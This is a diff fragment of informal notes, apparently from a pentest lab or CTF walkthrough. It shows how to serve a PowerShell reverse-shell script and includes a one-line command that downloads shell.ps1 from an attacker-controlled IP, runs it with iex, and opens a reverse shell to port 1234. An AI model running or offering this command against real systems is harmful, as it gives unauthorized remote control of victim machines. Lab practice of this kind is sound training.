@@ -11,6 +11,7 @@ port 81 (is where i have decided to open the port coz for me port 80 was already
 ip_address: 10.8.58.50 (check via ifconfig command or ip a| grep tun0)
 
 **NB**: After you have saved this script and opened a server now u can execute the following command on the target machine
+
 **2.** there multiple ways to do this first all u need to save the file as saved for me as shell.ps1 and after u need to execute the following command the target machine(anyway vulnerable that can allow you to run command or execute commands
 
 **command**: powershell -c iex (New-Object Net.WebClient).DownloadString('http://10.8.58.50:81/shell.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.58.50 -Port 1234
